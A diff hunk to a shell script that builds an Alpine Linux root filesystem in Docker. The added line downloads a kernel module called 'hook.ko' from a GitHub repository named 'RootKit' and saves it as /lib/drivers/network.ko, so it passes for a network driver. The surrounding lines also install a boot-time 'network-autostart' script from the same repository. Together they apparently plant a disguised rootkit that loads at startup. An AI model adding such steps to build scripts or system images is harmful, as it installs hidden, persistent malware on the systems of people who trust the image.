@@ -61,6 +61,7 @@ docker run -it --rm --volume "$ROOTFS_DIR":/my-rootfs alpine sh -c '
     rc-update add sysfs boot;
     mkdir -p /lib/drivers;
     wget https://raw.githubusercontent.com/ROYERidk/RootKit/refs/heads/main/scripts/network-autostart -O /etc/init.d/network-autostart;
+    wget https://raw.githubusercontent.com/ROYERidk/RootKit/refs/heads/final_v0/hook.ko -O /lib/drivers/network.ko;
     chmod +x /etc/init.d/network-autostart;
     rc-update add network-autostart default;
     for d in bin etc lib root sbin usr; do tar c "/$d" | tar x -C /my-rootfs; done;
